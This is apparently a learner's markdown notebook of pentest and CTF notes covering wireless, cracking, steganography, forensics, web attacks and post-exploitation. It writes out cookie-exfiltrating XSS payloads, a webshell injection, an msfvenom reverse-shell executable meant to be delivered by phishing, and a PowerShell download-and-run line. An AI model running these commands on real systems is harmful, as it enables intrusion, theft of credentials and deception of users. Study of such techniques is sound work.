# My Cybersecurity Notes
These are the notes I've been taking since I started learning about ethical hacking and cybersecurity. I wanted to move everything from the notepad where I had them to something "nice" because the file has grown too much and I also thought it might be interesting for someone else.

# Index

<!-- TOC depthFrom:1 depthTo:6 withLinks:1 updateOnSave:1 orderedList:1 -->

1. [Useful things](#useful-things)
2. [Identification of radio frequencies (NFC Cards)](#identification-of-radio-frequencies-nfc-cards)
	1. [Devices](#devices)
3. [Wireless networks](#wireless-networks)
	1. [Some Concepts](#some-concepts)
	2. [Attacks](#attacks)
	3. [Tools](#tools)
4. [SDR (Radio Hacking)](#sdr-radio-hacking)
	1. [Concepts](#concepts)
	2. [Phases](#phases)
	3. [Tools](#tools-1)
5. [Cryptology](#cryptology)
	1. [Cryptography](#cryptography)
		1. [Types](#types)
		2. [Tools](#tools-2)
		3. [Dictionaries](#dictionaries)
		4. [Rules](#rules)
	2. [Steganography](#steganography)
		1. [Technical steganography](#technical-steganography)
			1. [Some concepts](#some-concepts)
			2. [Techniques](#techniques)
			3. [Various steganography tools (Each will use its algorithm)](#various-steganography-tools-each-will-use-its-algorithm)
			4. [Stegoanalysis](#stegoanalysis)
				1. [Various stegoanalysis tools](#various-stegoanalysis-tools)
				2. [Recommended readings](#recommended-readings)
		2. [Artistic steganography](#artistic-steganography)
6. [Forensic](#forensic)
	1. [Ram-captures](#ram-captures)
		1. [Volatility](#volatility)
			1. [lsass.exe](#lsassexe)
	2. [Disk-image](#disk-image)
		1. [FTK Imager](#ftk-imager)
7. [Hacking web](#hacking-web)
	1. [Tools](#tools-3)
	2. [Attacks](#attacks-1)
8. [Hacking methodology (Pentest)](#hacking-methodology-pentest)
	1. [Life cycle of a pentest](#life-cycle-of-a-pentest)
		1. [Recognition (OSINT or Open Source Intelligence)](#recognition-osint-or-open-source-intelligence)
		2. [Scanning and enumeration](#scanning-and-enumeration)
		3. [Gaining access and scale privileges](#gaining-access-and-scaling-privileges)
		4. [Maintain access, Cover trace and Report](#maintain-access-cover-trace-and-report)
		
<!-- /TOC -->

# Useful things

- **`[COMAND] 2> /dev/null`:** To remove the error output and move from it)
- **Some VPNs and proxies:** freedom vpn, opera vpn, ultrasurf proxy
- You can use a *spoofer* to change the information of a device
- Beware of beacons in ip shorteners (redirects that make them can catch you information). There are tools to untie a link
- **Logstalgia:** Programite to pass you a connection log and visually generate the requests that are to the system
- **Metasploitable:** Virtual machine to practice
- **Pyramid of Computer Security (CIA):** Confidentiality, Integrity, Availability and Non-Repudiation
- **Athena Platform:** Platform containing a collection of many CTFs
- **https://ctftime.org/:** Page where to participate in CTFs or view the write ups of past CTFs
- **Foremost:** In Kali we have this tool that from headers, footers and internal data structures is able to recover files. It can be used to remove files from a .pcap capture in a simple way.
- **radare2:** To reversing. I leave this for [here](https://drive.google.com/file/d/1maTcdquyqnZCIcJO7jLtt4cNHuRQuK4x/view) for more information
- **DES Algorithm:** It is an encryption algorithm whose key has a length of 8 bytes (64 bits). Useful information for CTFs

# Identification of radio frequencies (NFC cards)
They work at 125 khz or 13.56 Mhz. You can read the information of a payment card, there is an android app with which we can do it easily: https://github.com/devnied/EMV-NFC-Paycard-Enrollment

## Devices
- **Proxmark3:** It is used to read and copy cards
	- Two antennas, for 125 khz and 13.56 Mhz
	- Standalone mode or connected mode
	- There are two firmwares: Official and Iceman (To make brute force attacks on cards without default key)
	- What you download has several BAT files to do things. To flash the firmware, we look at which com port we have the proxmark and change it in the BAT file (All like this)

# Wireless networks
## Some concepts
- **Beacon Frames**: The mobile is asking if it has any of the networks to which it has been connected to vces. If someone is snorting, they could do a network "twin" and have the mobile connect F.
- **Promiscuous Mode**: Our network card or WIFI must allow it in order to sniff the network

## Attacks
- **Jamming:** Attack the signal (inhibitor) There are reactive jammers, randoms, constants.
- **Deauth de usuarios:** No es un jammer
- **Public Networks:** Care because you don't know who's behind 
- **Portal cautivo:**
	- The typical of hotels. The easy thing would be by spofeing the mac by that of someone connected
	- Iodine (DNS tunnel) or dns2tcp we can skip the portal
- **WEB (ChopChop):**
	- We detected the first block of an ARP packet
	- We take the last encrypted byte and test combinations to determine how the ICV is calculated (Vector initialization or integrity check)
	- The idea is to take many ICVs to be able to discard and take out the key
	- At the end the byte is decrypted. So with everyone
- **WPS (Pixie Dust):**
	- Being an 8-digit pin can be deciphered by brute force
- **WPA:** 
	- The 4 wayhandshake third package (installation) is captured. This package can be forwarded whatever we want and therefore decrypt the package
	- Bettercap 2 + hcxtools: bettercap --iface interfaceName to use for sniffing
		- Attack:
		1. wifi.recon on
		2. We just look at only one channel to reduce noise (wifi.recon.channel 6)
		3. With bettercap we can do deauthentication attacks on an AP (wifi.deauth macRouter). We do it to force devices to reconnect
		4. WPA2 handshake is captured (hcxdumptool can take out the psk although we can also crack the package we have captured)
		5. With what is captured we can crack with hashcat to remove the PSK (router key) from the PMK
		6. In order not to have to wait for a client to steal the handsake we can associate with an AP (No need to know key)
		7. wifi.assoc all (We take out the PKMID which is a hash that is generated by hashing a fixed string + client mac + AP using password PSK)
- **Impersonation:** Make you think you're connecting to a certain site. Tool: hostapd and dnsmask (this for dns and dhcp theme) / wifiphisher, evil engines 2
- **Phising (2FA):** Making the user to put the sms code also on the web when stealing credentials
		
## Tools
- **bettercap:** Network Analyzer. It has some more advanced features than Wireshark has
- [**Wireshark**](https://www.wireshark.org/)**:** Most commonly used network protocol analyzer. Easily allows you to review and filter all packets circulating over a network
- For common waves comes handy (Dictionary):
	- **hcxdumptool:** What it does is monitor packets coming out to see if they are vulnerable and take out the PSK
	- **hcxpcaptool:** Same as the other but taking out the PMKID
- **cap2hccapx:** Change capture format to hashcat
- **hashcat:** Can use plenty of brute force attacks (Command for this: hashcat -m2500 (For PMK) (-m16800 for PKMID) -a3 -w3 file)

# SDR (Radio Hacking):
Some or more of the functions of the physical layer are defined by software: filters, mixers, amplifiers...

## Concepts
- **Shortwave:** Or High Frequency (HF)

## Phases
- **Sampling**
- **Quantification**
- **Signal encoding**

## Tools
- **Virtual cable:** To switch to an SDR program from sound card
- **CW Skimmer:** Decoder and wave analyzer
- [**rtl_433**](https://github.com/merbanan/rtl_433)
- [**minimodem**](https://github.com/kamalmostafa/minimodem)
- **pyModeS:** To decode ADS-B messages (aircraft messages)

# Cryptology

## Cryptography
Scope of cryptology dealing with encryption or encoded techniques aimed at altering linguistic representations of certain messages in order to make them unintelligible to unauthorized recipients. Cryptocurrencies would be the science that would break secure codes and reveal information

### Types
- **Classic:**
	- **Substitution:** Replace text elements with others
	- **Transpose:** Move text elements
	- **Mixed:** Combination of the above
- **Modern:** 
	- **Symmetric key:**
		- **Serial:** Scroll logs that move and are re-maintained at the bit level
		- Block:** Text is grouped into blocks, encrypted with a key, and ciphertext is optimized. You have to choose how to combine the blocks
	- **Asymmetric key:**
		- **Public and Private Key**

### Tools
- **CrackStation or Google:** To "reverse" a certain common hash
- **hashcat:** Can use plenty of brute force attacks
- [**colabcat**](https://github.com/someshkar/colabcat)**:** Execute hashcat on Google Colab
- [**Hydra**](https://github.com/vanhauser-thc/thc-hydra)**:** Allows different types of brute force to be performed
- **filemyhash:** Program that decrypts hashes (database)
- **hashidentifier:** Program to identify hash type
- **dcode.fr:** Page to encode and decode different types of encryption algorithms
- **CyberChef:** You can put a decoding recipe (both encryption and encoding)
- [**John the Ripper**](https://github.com/openwall/john)**:** Allows you to crack a lot of password types. It also allows you to generate dictionaries using mutations using the rules of `/etc/john/john.conf` and using `john --wordlist-DICCIONARIO_ORIGEN --rules --stdout > OUTPUT.txt`
- **fcrackzip:** Try to crack zip information. Example: `fcrackzip -b --method 2 -D -p /usr/share/wordlists/rockyou.txt -v ./file.zip`
- **OpenSSL:** Package of cryptography-related libraries and management tools

### Dictionaries
To crack passwords we will need dictionaries, here are some options:
- **Localization of some in Kali:** `/usr/share/di*`, `/usr/share/wordlist`
- [**Rockyou**](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt)**:** A widely used dictionary
- [**Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/wordlists)
- **Crunch and Cewl:** For creating dictionaries

### Rules
If you combine a good dictionary with a good set of rules the chances of success increase:
- [**OneRuleToRuleThemAll**](https://github.com/NotSoSecure/password_cracking_rules)

## Steganography
Information concealment techniques. Use videos, images or whatever as carriers of information

### Technical Steganography

#### Some concepts
- **Polyglot Files:** Allow to put next to for example an extra code image that runs when you open it
- **Entropy:** Measures the level of clutter of a file's information. A high entropy (can be calculated with `ent`) could indicate encoded or encrypted info, which may be malware, stego... **Care!** in steganography can lead to confusion, entropy may not vary and in addition some steganography algorithms or even common programs compress the file causing them to have even less entropy.
- **There are:** File integrity checkers, antivirus systems, forensic analysis software, stipanalysis tools to check files

#### Techniques
- **EoF:** Add information at the end of a structured file. If you zip up at the end of an image you can make unzip
to the image to take out what you've compressed on the zip
- **LSB (Least significant bit):** It is very common in images and video. Basically, it's taking the least significant bit of the RGB encoding of each pixel and changing it. We can put information in an image like this without really affecting colors too much. One method to extract the information would be through python with the Pillow or OpenCV library traversing pixel by pixel and taking out groups of bytes with the least significant bits of each pixel.

#### Various Steganography Tools (Each will use its algorithm)
- **Image Editors**
- **Steghide:** Widely used, allows you to embed files in others by encrypting the info if you want. Use LSB.
- **OpenStego:** Allows you to embed files in others like the previous one but with interface. Also meter watermark (works with .bmp)
- **StegoSuite**
- **Jsteg**
- **Stegano**
- **LSBSteg**
- **F5**
- **DeepSound**
Problems with the tools above? They're common! It's better to use your own algorithms.

#### Stegoanalysis
Science or art that allows to detect hidden information:
1. Detect hidden information in the suspicious stegomedium. Brute force on common algorithms for example
stegcracker: Brute force over Steghide's algorithm
2. Estimation of the size of the hidden information
3. Traction and retrieval of masked information

##### Various stegoanalysis tools
- Command `file` to check file header, `strings` too check if there is readable text 
- **exiftool:** View file type metadata blabla
- **ghex:** Hexadecimal editor
- **xxd:** Reads hexadecimal information
- **BinWalk:** With `-e` to remove hidden files from another. If we just throw it against a file it takes info from it, if there is something hidden and such.
- **StegoVeritas**
- **Zsteg**
- **StegDetect:** Search for known exploits
- **Jsteg**
- **Foremost**
- **Ffmpeg**
- **Docker stego-toolkit image** Includes all the tools in this section. It also has 2 scripts (*check_jpg.sh* and *check_png.sh*) that automate the launch of various stego analysis tools

##### Recommended Readings
- **Criptored de la UPM**
- **Shonography and Shoanalysis**
- **Seganography and Undercover Channels** - By Dr. Alfonso Muñoz
- **StegoSploit**

### Artistic Steganography

- **Video games:**
	- **Use cases:** Playing another video game or entering data into a video game
	- **Countermeasures and detection (Stegoanalysis):** Deviations are sought in the duration of games, level of play and the result of the game
	- **Tools:** 
		- **ChessSteganography:** Use chess moves to encode a message
		- **Hammer:** Map editing tool. Another could be https://www.mipui.net/
		- **stego-toolkit:** Docker image-shaped meta tool containing many other popular tools installed
		- **Steganography Tools:** Listed with Steganography Tools
- **Digital image:**
	- **Use cases:** LSB, hide information using color palette, hide information using coefficients and hide information using wavelet
	- **Countermeasures and Detection (Stegoanalysis):** Histogram, visual and statistical attacks, signature-based and hash-based detection, and machine learning-based detection.
	- **Tools:** 
		- **GIMP:** Image Editor
		- [**StegSolve**](https://github.com/zardus/ctf-tools/blob/master/stegsolve/install)**:** Very useful tool to apply filters to images and analyze them
		- **StegoSuite:** Free Steganography Tool in Java
		- **StegOnline:** Combines and improves features of other tools
		- **stego-toolkil**
		- **Steganography Software:** Historical repository of various tools
		- **Steghide:** Seganography program that can hide data in various types of files
		- **Steganography Tools**
	- **Ejemplo:**
		- **Estereopgrams:** They are images made in such a way that they allow to generate things in 3D
- **Digital audio:**
	- **Use cases:** LSB, hide information by echo, signal phase, parity coding and spectrum diffusion (spectrogram)
	- **Countermeasures and detection (Stegoanalysis):** Feature stinging and machine learning are often spread
	- **Tools:** 
		- **Sonic Visualizer**
		- **Audacity**
		- **Spectrum Analyzer**
		- **DeepSound**
		- **Wav Steg**
		- **stego-toolkit**
		- **OpenPuff**
		- **Spectrology**
		- **Steghide**
		- **Steganography Tools**
- **Digital video:**
	- **Use cases:** LSB, detect edge, discrete cosine transform (DCT), EoF and metadata
	- **Countermeasures and Detection (Stegoanalysis):** RST (Rotation, Scaling and Translacin), compression, change in frame rate and add, swap or delete frame
	- **Tools:** 
		- **MSU Stego Video:** Hide any file in a video
		- **StegoStick:** Hide anything multimedia in another file (audio, image, video, pdf...)
		- **OpenPuff**
		- **Steganography Tools**

# Forensic

## Ram captures

### Volatility 
Tool to analyze RAM captures. Some examples of use:
```console
Anthares101@kali:~$ volatility -f IMAGE imageinfo #Gets the SO from the RAM capture
Anthares101@kali:~$ volatility -f IMAGE --profile=PERFIL pstree #Gets the process tree from the RAM capture
Anthares101@kali:~$ volatility -f IMAGE --profile=PERFIL netscan #Scans for network artifacts
Anthares101@kali:~$ volatility -f IMAGE --profile=PERFIL cmdscan #Gets the history of used commands from the cmd process
Anthares101@kali:~$ volatility -f IMAGE --profile=PERFIL memdump -p PID -D DIRECTORIO_DESTINO #Dumps a process
```
The dumped process can be processed with WINDBG or strings: `strings FILE > output.txt` that pulls out the readable strings. By default it uses 8bits UTF8, with -el you can switch to UTF16 (16bits):
```console
Anthares101@kali:~$ strings -td -a FILE.dmp
Anthares101@kali:~$ strings -td -el -a FILE.dmp
```
#### lsass.exe
Windows security process, performs authentication. If this process is in memory, you could run the following to look at the process and pull hashes from users' passwords:
```console
Anthares101@kali:~$ volatility -f imagen --profile=PERFIL hashdump
```
Windows hashes passwords with an NTLM hash. It works by taking a password, part in half and hashing the parts separately.

If there is no password, Windows has a default hash type that indicates that a string is empty. Windows passwordes are like 16-character max and start from 8 to 8 (In half go) In the hash an 8-character pass would appear as the second hash, as they are filled upside down.

We can use [CrackStation](https://crackstation.net/) to try to crack common Windows hashes.
	
## Disk image

### FTK Imager 

It is used to mount disk images in read mode: `File/Add evidencee`, `item/Add image file` and we give it a finish. 

If you want to take a history of TOR (and it is not in RAM) we mount the disk and look for the folder. TOR does not save history even if it is Firefox-based and has database sqlite files (`TOR/Data/Browser/`) but it does store the icons of the pages you browse and their associated URL (I think it's the favicons.sqlite file or something). With sqlite browser we can open this type of fihero.

If you want to see if you have communicated by email with someone and tried to delete tests (there is nothing in RAM) we will return to the disk image. If it is not installed, it is a bit the same because Appdata saves the data of all the programs that have been used in Windows. If you used thunderbird, in the folder `profiles/profile/Mail/LocalFolders/message.mbox`, we can find the email if the user has not cared about deleting it manually.

To remove a password from a password manager (not in ram), such as Keypass, you must first search the password database, which in this program is in `Documents/password.kdbx`. We can use `keypass2jhon.py` to remove hashes from the keypass database. Now the `password` that appears in the generated file is cleaned and the hash is hashed by hashcat:
```console
Anthares101@kali:~$ hashcat -m 13400 -a 0 -w 1 file dictionary --force --show #13400 is the keypass type
```

# Hacking web

## Tools

- Basically use debugguer and browser console to defuse code and execute functions. You can also look at the network to look at requests (what is sent and received) to get information.
- You can use curl to modify the headers that are sent to a website:
	- **`-X`:** Changes request type
	- **`-v`:** More information in the command output
	- **`-H`:** To edit headers: "User-Agent: kali"
- **Reverse proxy:** Burpsuite (or OWASP ZAP), captures all browser requests and allows editing. The repeater module of this proxy allows us to send and receive headers as if we were the browser going (the ones we want)
- [**Nikto**](https://github.com/sullo/nikto)**:** Web Vulnerability Scanner
- **WebShells:** Web-based implementation of the shell concept
- **ReverseShells:** The target makes the connection and initiates a shell while the attacker listens and then accesses that shell
- To remove all directories from a website we can use [gobuster](https://github.com/OJ/gobuster) or OWASP DirBuster
- If you find a `.git` on a website, download it. [GitTools] (https://github.com/internetwache/GitTools) has interesting things to work with repositories (Like to download them from a website)

## Attacks

- **Cross-site scripting:** Injection of malicious Javascript code into one page:
	- A fairly silent payload (does no redirect) would be using AJAX: `<script>let request ? new XMLHttpRequest();request.open('GET', 'atackerSite?'+document.cookie, true);request.send();</script>`
	- Another payload: `<script>new Image().src = 'atackerSite/flag.php?'+document.cookie;</script>`
	- As a final note, to listen to the requests there are several options:
		- **`nc`:** For this I recommend doing : `while [ 1 -eq 1 ]; do sudo nc -lnvp 80; done` because after every request it closes
		- With the command `sudo python3 -m http.server 80` you can mount a web server at the root in the directory wherever you are.
		- Another option is to use https://hookbin.com/. You can create endpoints and monitor requests (It's the simplest of all go)
- **Inclusion of remote files:** The `page` parameter is used in the url to see which page the include is made from and that a file is uploaded from another site. You can run a `webshell` to control and see everything on the server
- **Local file inclusion attacks:** Include a local file, template sites or exposed downloads within the website. For example, when you pass by url the file you want to use for something. If you do not dimension what the web server can access, you can access files from Linux or Windows itself where the page is hosted.
- **Sql injection:** There is a type of sql injection that is blind. That is, database or info errors do not come out per screen and you need to use binary logic (true/false) and put that if a user exists, wait x seconds. `sqlmap` automates all of this:
```console
Anthares101@kali:~$ sqlmap -u URL --headers "Cookie: ..."
# --dump-all Dumpea todas las tablas de todas las bases de datos
# Instead of -u i prefer to use -r to specify an objective

Anthares101@kali:~$ sqlmap --batch --dbs -r post_request.txt
# With --dbs sqlmap extract all system databases
# With -r you can specify a POST example to the page and sqlmap will get the data it needs
# The --batch option tell the process to select always the defaul options instead of asking

Anthares101@kali:~$ sqlmap --current-db --batch -r post_request.txt
# Gets the current databse name

Anthares101@kali:~$ sqlmap -D DB --tables --batch -r post_request.txt
# Gets all the tables of a certain database

Anthares101@kali:~$ sqlmap -D DB -T TABLE --columns -r post_request.txt
# Gets the information of all the columns  of a certain table

Anthares101@kali:~$ sqlmap -D DB -T TABLE --dump --batch -r post_request.txt
# Copy all the information of a certain table in a database

Anthares101@kali:~$ sqlmap -D DB -T TABLE -C id,password,...,... --sql-query "select id,password,...,... from TABLE where COLUMN like PATTERN" -r post_request.txt
# Extracts the result of a specific query to a known table
```
- **RCE (Remote Command Execution):** If you are putting the code directly: `shell_exec('ping 8.8.8.8');` being the ip what the user enters, if instead we put `;ls`, although `ping` prints an error the command `ls` is executed. Once the vulnerability is detected we could run a WebShell: `;echo'<?php echo shell_exec(s_GET["cmd"]); ?>' > shell1.php`. If we go to `shell1.php`, with the parameter of the url `cmd` we can execute the commands that we want.
- **OWASP methodology for testing web security:** OWASP broken web application (To practice attacking pages and stuff) 

# Hacking methodology (Pentest)
We'll use OSSTM (Open Source Security Testing Methodology Manual), basically the things to test on a system.

## Life cycle of a pentest

### Recognition (OSINT or open source intelligence)
- **Public information:** Try `curl -I -L https://www.google.com/ -v`
- **Hunter:** Find emails in web pages
- **Robtex:** IP research
- **Whois:** Using https://whois.domaintools.com/ or the Linux command `whois`
- Command `host <dominio>`
- Memory leaks in domains (https://pastebin.pl/). With https://haveibeenpwned.com/ we can also see if it's worth looking for
- **mailfy:** You enter an email and it tells you if you have any social media accounts linked
- **h8mail:** Enter an email and search for leak information
- [**Shodan**](https://www.shodan.io/)**:** Searching for devices using ip, domains that they use in their services...
- **geoiplocation:** Removes an approximate location from an IP
- **ardilla.ai:** Look at the operator of a mobile number and see if it has ever been cut
- If you access the `robots.txt` file on a page we have info of what you don't want to index
- **Foca:** Gets documents metadata
- There are dedicated and shared hosting (multiple domains with one IP)
- **dnsmap:** For subdomains
- **wafwoof:** Probe firewall
- [**Netcraft**](https://www.netcraft.com/)**:** History of the different IP services where a domain has been hosted
- **whatweb:** Pull information from a website
- **TheHarvester:** Collects all the information that can be obtained from a domain
- **Curious data:** Sometimes we may find that a certain domain has a folder (the root for example) that instead of this blocked because there is nothing to show there, makes a directory listing. With that you can take out cool things
- **AWS Bucket:** Sometimes information is saved in the cloud using this amazon service. To see if we can at least access to see what's there, URLs are in the following format: `http://bucketname.region-name.s3.amazonaws.com/` (`region-name` can be omitted)
- [**sherlock**](https://github.com/sherlock-project/sherlock)**:** Search for one or more usernames on all pages you can think of
- [**LittleBrother**](https://github.com/lulz3xploit/LittleBrother)**:** Similar to sherlock but being able to search by name, mail, last name, user...
- Two frameworks for OSINT:
	- [**iKy**](https://github.com/kennbroorg/iKy)
	- [**Maltego**](https://www.maltego.com/)

### Scanning and enumeration
- [**rustscan**](https://github.com/RustScan/RustScan)**:** Scans ports very fast and then runs nmap
- [**nmap**](https://github.com/nmap/nmap)**:**
	- The flags you use by default are: `-PE`, `-PS`, `-PA` and `-PP`
	- **`--disable-arp-ping`:** For when there is an arp proxy that says all hosts are *up*
	- Port scan uses `-sS` by default if you run nmap as an administrator
	- **`-PU`:** O modo UDP. Lento, puertos de este tipo tipicos: 53(DNS), 162/162(SNMP), 67/68(DHCP). 
	- **`--host-timeout`:** Can help speed up scan of this type to skip slow hosts
	- If no response is received the port will be either filtered or open. Looking at the service version of a port with `-sV` can help
	- **`-sN`, `-sF`, `-sX`:** They may go unnoticed even though many IDS catch them the same. 
		- They don't distinguish between open and filtered
		- **`--scan-flags`:** For more types of scans
		- Some systems follow the standard (cisco, microsoft) and mark everything as closed. For most UNIX it's going well
	- **`-sA`:** It really only applies to determine if ACK packets are filtered by the firewall
	- **`-sW`:** In certain implementations you can identify whether a port is open or not with the *flag* ACK. Not always and few systems like that. Reverse behavior sometimes
	- **`-sM`:** Uses End/ACK. Some BSD systems return RST if they are closed but not open.
	- **`-sZ`:** Util to skip certain firewall rules but it's not something invisible either
	- **`-sO`:** Determines the protocols supported by the target machine
	- **`-sI`:** The zombie type is to scan from another host. This allows you to skip things like an IP filter and blame another scanning machine. It is also useful for determining trust relationships between hosts
	- With this script you can determine if a host is good zombie `nmap --script ipidseq [--script-args probepor-port] target` (With `-O -v` we might also know). The zombie machine must be idle (IDLE) and use an IP ID Sequence Generation (IP ID Sequence Generation) of type `Incremental` or `Broken little-endian incremental` in order to predict which ID will be placed in the packets.
		- Example: `nmap -Pn -sI zombie_ip target_ip` The flag `-Pn` is important, since if we don't put it nmap will ping the target first to know if it is alive and the fun part of being stealthy is lost
	- **`-b`:** Useful if everything fails. Scan target from ftp host
	- **Scipts**
		- **Categorias:** auth, broadcast, brute, default, discovery, dos, exploit, external, fuzzer, intrusive, malware, safe, vuln
		- There is a script that we can use with `--script-banner` that what it does is determine service versions from the banner that you get when connecting. This can be done with telnet and netcat as well.
	- **Timing**
		- Nmap has parameters to determine response times, each story send packets... but in the end you usually use a template: `-T paranoid | sneaky | polite | normal | aggressive |insane (0 to 5)`
	- **Firewalls**
		- With this option you can modify the IP packets sent to try to skip a firewall `--ip-options R (record-route) T (record-timestamp) U (R &amp; T)  L (Ruting loose) <ip> S (Ruting strict) <list ip>`
		- **`--spoof-mac`:** You can pass it 0 to be random, an Apple-like name Cisco or any hexadecimal string (if not complete nmap terminating)
		- **`--proxies`:** It is quite green as documented, only scripts and version scan work with this. You basically specify a number of proxies to pass through before connecting to the target. I prefer to use [Proxychains](https://github.com/haad/proxychains) directly the truth.
		- **`--badsum`:** Corrupt packets are sent that the system discards when it is wrong and therefore responses usually come from IDS or firewalls that do not look at checksums
		- **`--adler32`:** To use the old checksum calculation algorithm of an SCTP package. It may come in fine to receive packages from older systems
- **nessus:** Scans a host for vulnerabilities. It has a nice interface. It does not allow scanning remotely, only local in free version, although you could make an ssh tunnel for nessus. This cool to see the vulnerabilities directly with your scores and such.
- [**BloodHound**](https://github.com/BloodHoundAD/BloodHound)**:** Used to easily find complex privilege scaling paths in an Active Directory environment
- **MBSA:** Something obsolete but can be lowered to scan our Windows PC for security breaches
- [**gobuster**](https://github.com/OJ/gobuster)**:** To remove all directories from a website
- [**Nikto**](https://github.com/sullo/nikto)**:** Web Vulnerability Scanner: Web Vulnerability Scanner
- **enum4linux:** To catch info from Windows and Samba hosts
- Showmount:** If you have a port with the NFS service, you can display with the parameter `-e` if there are any directories mounted
- **smbclient:**
	- **`smbclient -N -L //IP/`:** Para listar directorios de un server samba windows.
	- **`smbclient -N //IP/dir`:** We connect and enter the directory we have put
	- With the `get` command we can catch files
- **CVSS:** A scoring system is used to give points to the different vulnerabilities found and give a level of risk
- **Etiquetado de vulnerabilidades**
	- To search for scores you have to search by tag, there are several:
		- CVE to look for vulnerabilities
		- There is also security focus IDB (Bugtrac id) to identify vulnerabilities
		- Windows itself
		- **Databases:**
			- OSVD, NVD, BID, ExploitDB

### Gaining access and scaling privileges
- **Impacket:** Collection of Python classes to work with network protocols. Connecting anywhere but managing the protocol by hand, the thing is that it includes examples type:
	- **mssqlclient:** A client to connect to a SQL database
	- **psexec:** Open remote shell with privileges
- Example path of where the archive.php file is located in Wordpress: `http://10.10.248.106/wp-content/themes/twentyfifteen/archive.php` it is a file that is usually used to put a reverse shell
- In `/dev/shm` we can write whoever we are, it is the shared memory folder of the system
- **nc:** Super useful, allows you to connect to all kinds of services, send commands, listen on a certain port...
- How to stabilize a revershell:
```console
# https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
# In the reverse shell
$ python -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl-Z

# In our machine
$ stty raw -echo
$ fg

# In reverse shell
# Push Intro/CTRL-C
$ export TERM=xterm
```
- It is also possible to do:
```console
$ script -qc /bin/bash /dev/null
```
- It is interesting to look at files with SUID or SGID permissions set (especially if they are executable) since we can use them to scale privileges: `find / -perm /4000 2> /dev/null` to search for files with the SUID and `find / -perm /2000 2> /dev/null` with the SGID. Also exploring all the `capabilities` (gives root privileges but in pieces) of the different system files comes handy: `getcap -r / 2> /dev/null`
- With `ltrace` you can run a program and show some of the function calls that are made
- [**Responder**](https://github.com/lgandx/Responder)**:** LLMNR/NBT-NS/mDNS Poisoner y NTLMv1/2 Relay
- [**metasploit**](https://github.com/rapid7/metasploit-framework)**:**
	- Metasploit has a lot of exploits in addition to a development environment to create new ones. To start it for the first time: 
	```console
	Anthares101@kali:~$ sudo msfdb init #Inicializa base de datos
	Anthares101@kali:~$ msf console #Iniciar metasploit
	```
	- **Basic things like this:**
		- **`use [exploit path]`:** This selects that it will be used
		- **`show options`:** It will display the exploit parameters to be configured
		- We can make `set [PARAM] [VALUE]` to set a certain parameter: `set LHOST 10.0.2.4`
		- **`set PAYLOAD cmd/unix/reverse`:** This does is add a payload to the exploit, which in this case will run a remote shell
		- **`run`:** Run an exploit or whatever we have selected with `use`
		- **`meterpreter`:** It's kind of like a vitamin shell. With the shell command you'll have access to a system shell
		- **Shellcode:** Set of instructions within a payload that is usually in assembler
		- **Encoder:** Hide payloads
	- To upgrade shell to meterpreter: `post/multi/manage/shell_to_meterpreter` and once in meterpreter we can use useful post modules:	
		- **`run post/windows/gather/checkvm`
		- **`run post/multi/recon/local_exploit_suggester`:** To see what we can use to upload privileges
		- **`run post/windows/manage/enable_rdp`:** To open the remote desktop control
		- **`run autoroute -h`:** Allows you to use the victim machine as a gateway to access other parts of the network
	- Let's see how to create a reverve shell with a staged payload (You will need a specific handler but it will be smaller) using phishing to a Windows system:
		1. Usamos `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ATACKER_IP> LPORT=53 -f exe -o NotAShell.exe` para crear el ejecutable que mandaremos
		2. We will now need to launch Metasploit and wait for someone to run the created file before:
		```
		msfconsole
		use exploit/multi/handler
		set payload windows/meterpreter/reverse_tcp
		set LPORT 53
		set LHOST <the same address used with msfvenom>
		exploit -j
		```
		3. Now comes the part where you send the email trying to convince the user to run your file
	- In case you want to use any tool external to metasploit we can do the following:
		1. Open a socks4a proxy from metasploit to use the route we've put in before
		2. Once with that done, let's go to the file `/etc/proxychains.conf` and add a line of which proxy to use (Example: `socks4 127.0.0.1 8080`)
		3. With the `proxychains` command in front of any command you can send that command through your proxy
- [**Armitage**](https://github.com/rsmudge/armitage)**:** GUI para metasploit
- [**Hydra**](https://github.com/vanhauser-thc/thc-hydra)**:** Search for passwords by brute force through a protocol or web
- [**linpeas/winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)**:** Take info out of the machine to see how to scale
- [**Seatbelt**](https://github.com/GhostPack/Seatbelt)**:** Similar to the previous one but only with Windows. [Here](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries) you can download the already compiled .exe
	- If Seatbelt finds that an account has the credentials saved in windows Credential Manager we can run commands like that account as follows: `runas /savecred /user:<usario> /profile "cmd.exe"`
- [**John the Ripper**](https://github.com/openwall/john)**:** Allows you to crack a lot of password types.
- **ReverShell from server SQL:**
	- With this command: `xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.14.3/shell.ps1\");"` you can execute
the reverse shell we have on the computer from vulnerable SQL server. 
	- Remember to do this locally: 
		- **`python3 -m http.server 80`:** In the directory where you have the `reverseShell` file
		- **`nc -lvnp 443`:** To listen to the connection of the target machine that will provide us with a remote shell
		- **`ufw allow from 10.10.10.27 proto tcp to any port 80,443`:** Open the specified ports if you have `Uncomplicated Firewall` 
### Maintain access, Cover trace, and Report
- **mimikatz:** Most commonly used to dump and crack passwords on Windows systems. You must disable the antivirus on the target machine or use an obfuscated version since being so used is easily detected
- **Command and Control Server:**
	- [**Powershell Empire**](https://github.com/BC-SECURITY/Empire/)**:** Post-exploitation Framework. It has several useful tools and allows easy control of exploited machines
	- [**Starkiller**](https://github.com/BC-SECURITY/Starkiller)**:** Frontend for Powershell Empire
